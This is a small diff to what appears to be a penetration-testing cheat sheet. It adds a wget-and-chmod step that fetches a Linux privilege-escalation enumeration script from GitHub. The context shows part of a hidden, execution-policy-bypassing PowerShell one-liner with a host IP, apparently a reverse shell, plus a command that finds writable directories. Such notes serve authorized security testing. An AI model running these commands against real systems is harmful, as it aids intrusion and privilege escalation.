@@ -119,3 +119,6 @@ powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx
 Find writeable directory in linux:
 
 find / -type d -writable 2>/dev/null
+
+Using wget to download file and setting permission:
+wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
